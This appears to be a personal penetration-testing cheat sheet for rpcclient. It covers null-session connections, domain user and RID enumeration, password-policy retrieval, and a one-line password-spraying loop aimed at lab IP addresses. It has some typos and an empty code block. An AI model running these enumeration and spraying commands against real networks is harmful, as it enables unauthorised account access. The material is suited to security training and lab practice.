---
type: tool
category: rpc
tags:
  - tool
---
# Overview
Is a tool which allows to perform MS-RPC functions.
## Quick Commands
Connect without username to smbshare:
```bash
rpcclient -U "" 10.129.5.101 
```

^6a4596

Connect with username and password:
```bash

```
#### Enum Users with SMB Null Session
1. Connect to target with `anonymous` "user"/ NULL session:
```bash
rpcclient -U "" -N 172.16.5.5
```
2. Retrieve usernames:
```bash
enumdomusers
```


#### RPCClient User Enumeration By RID
Since all built-in Administrators always have the same RID `Hex 0x1f4` . We can abuse this to enumerate further information about it (if still existing):
1. Connect to target with `anonymous` "user"/ NULL session:
```bash
rpcclient -U "" -N 172.16.5.5
```
2. Retrieve user information of `built-in Admin`:
```bash
queryuser 0x1f4
```

#### Retrieving Password Policies with SMB Null Session
1. Connect to target with `anonymous` "user"/ NULL session:
```bash
rpcclient -U "" -N 172.16.5.5
```
2. Retrieve password policies:
```bash
querydominfo
```

#### Password Spraying - Rpcclient
`Rpcclient` is an excellent option for performing this attack from Linux. An important consideration is that a valid login is not immediately apparent with `rpcclient`, with the response `Authority Name` indicating a successful login.
We can filter out invalid login attempts by `grepping` for `Authority` in the response.
```bash
for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority; done
```

## Important Commands
After connecting via rpcclient there are loads of usefull enum-commands:
	`help` = lists options
	`netshar eenum` = Enums smbshares (e.g. full path of share)
	`enumdomusers` = Lists all domain and local usershe
	`enumalsgroups` = Lists local groups such as administrators
	`srvinfo` = Displays the OS version, server name, and domain affiliation
	`querydominfo` = query domain information such as password policy
	``
